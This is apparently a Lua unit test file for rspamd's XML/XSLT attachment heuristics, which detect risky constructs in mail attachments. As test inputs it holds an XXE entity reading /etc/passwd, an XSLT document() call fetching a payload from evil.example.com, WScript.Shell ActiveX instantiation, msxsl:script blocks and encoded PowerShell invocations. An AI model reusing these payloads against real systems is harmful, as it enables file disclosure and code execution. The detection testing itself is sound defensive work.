-- XML/XSLT attachment heuristics (lua_content/xml)

context("XML/XSLT attachment heuristics", function()
  local rspamd_task = require "rspamd_task"
  local xml = require "lua_content/xml"

  local hdrs = "From: <>\nTo: <nobody@example.com>\nSubject: test\n"

  local function get_task()
    local _res, task = rspamd_task.load_from_string(hdrs .. "\n", rspamd_config)
    task:process_message()
    return task
  end

  test("non-XML input returns nil", function()
    local task = get_task()
    local res = xml.process("just some plain text", nil, task)
    assert_nil(res)
    task:destroy()
  end)

  test("clean XML produces no flags", function()
    local task = get_task()
    local input = [[<?xml version="1.0"?><root><item>hello</item></root>]]
    local res = xml.process(input, nil, task)
    assert_not_nil(res)
    assert_equal(res.tag, 'xml')
    assert_false(res.is_xslt)
    assert_false(res.has_msxsl_script)
    task:destroy()
  end)

  test("detects msxsl:script and XSLT stylesheet", function()
    local task = get_task()
    local input = [==[<?xml version="1.0"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
<msxsl:script language="JScript" implements-prefix="user"><![CDATA[
function evil() {}
]]></msxsl:script>
</xsl:stylesheet>]==]
    local res = xml.process(input, nil, task)
    assert_not_nil(res)
    assert_true(res.is_xslt)
    assert_true(res.has_msxsl_script)
    task:destroy()
  end)

  test("detects dangerous ActiveX ProgID", function()
    local task = get_task()
    local input = [[<?xml version="1.0"?>
<root><script>var x = new ActiveXObject("WScript.Shell");</script></root>]]
    local res = xml.process(input, nil, task)
    assert_not_nil(res)
    assert_true(res.has_activex)
    task:destroy()
  end)

  test("detects PowerShell invocation", function()
    local task = get_task()
    local input = [[<?xml version="1.0"?>
<root><script>powershell.exe -EncodedCommand ZXZpbA==</script></root>]]
    local res = xml.process(input, nil, task)
    assert_not_nil(res)
    assert_true(res.has_powershell)
    task:destroy()
  end)

  test("detects external entity (XXE) declaration", function()
    local task = get_task()
    local input = [[<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>]]
    local res = xml.process(input, nil, task)
    assert_not_nil(res)
    assert_true(res.has_external_entity)
    task:destroy()
  end)

  test("detects XSLT remote document() call", function()
    local task = get_task()
    local input = [[<?xml version="1.0"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
<xsl:variable name="d" select="document('http://evil.example.com/payload.xml')"/>
</xsl:stylesheet>]]
    local res = xml.process(input, nil, task)
    assert_not_nil(res)
    assert_true(res.has_remote_document)
    task:destroy()
  end)

  test("extracts URLs from XML content", function()
    local task = get_task()
    local input = [[<?xml version="1.0"?><root><url>http://evil.example.com/data</url></root>]]
    local res = xml.process(input, nil, task)
    assert_not_nil(res)
    assert_true(#res.urls > 0, "expected at least one URL extracted")
    task:destroy()
  end)

  -- Regression: the detection patterns are case-insensitive, so no
  -- case-sensitive prefilter may sit in front of them. A mixed-case ProgID
  -- previously slipped past the plain string gate and was never scanned.
  test("detects ActiveX ProgID regardless of case", function()
    local task = get_task()
    local input = [==[<?xml version="1.0"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
<msxsl:script language="JScript"><![CDATA[
var s = new activeXobject("WScript.Shell");
]]></msxsl:script>
</xsl:stylesheet>]==]
    local res = xml.process(input, nil, task)
    assert_not_nil(res)
    assert_true(res.has_activex)
    task:destroy()
  end)

  test("detects msxsl:script regardless of case", function()
    local task = get_task()
    local input = [==[<?xml version="1.0"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
<MSXSL:Script language="JScript">var x = 1;</MSXSL:Script>
</xsl:stylesheet>]==]
    local res = xml.process(input, nil, task)
    assert_not_nil(res)
    assert_true(res.has_msxsl_script)
    task:destroy()
  end)

  test("detects PowerShell invocation regardless of case", function()
    local task = get_task()
    local input = [==[<?xml version="1.0"?>
<root><cmd>POWERSHELL.EXE -EncodedCommand ZQBjAGgAbwA=</cmd></root>]==]
    local res = xml.process(input, nil, task)
    assert_not_nil(res)
    assert_true(res.has_powershell)
    task:destroy()
  end)

  test("nil input returns nil rather than scanning the string \"nil\"", function()
    local task = get_task()
    local res = xml.process(nil, nil, task)
    assert_nil(res)
    task:destroy()
  end)
end)
